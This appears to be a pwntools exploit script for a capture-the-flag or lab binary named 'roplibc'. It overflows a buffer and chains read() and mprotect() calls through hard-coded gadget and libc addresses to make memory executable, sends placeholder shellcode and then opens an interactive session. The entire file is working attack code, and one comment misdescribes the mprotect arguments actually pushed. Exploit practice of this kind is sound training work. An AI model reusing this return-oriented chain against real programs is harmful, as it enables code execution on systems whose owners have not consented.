#!/usr/bin/python
from pwn import *

shellcode = "A"*10 + "\x0a"

globalBuf = 0x08049000
memory = 0x8049720
mprotect = 0xf7ec59b0

readPLT = 0x80482c0

pppr = 0x08048489

s = process("./roplibc")
pause()

payload = "A"*76

# read(0, memory, len(shellcode))
payload += p32(readPLT)
payload += p32(pppr)
payload += p32(0)
payload += p32(memory)
payload += p32(len(shellcode))

# mprotect(memory, len(shellcode), 4)
payload += p32(mprotect)
payload += p32(memory)
payload += p32(globalBuf)
payload += p32(100000)
payload += p32(7)

s.sendline(payload)
s.sendline(shellcode)

s.interactive()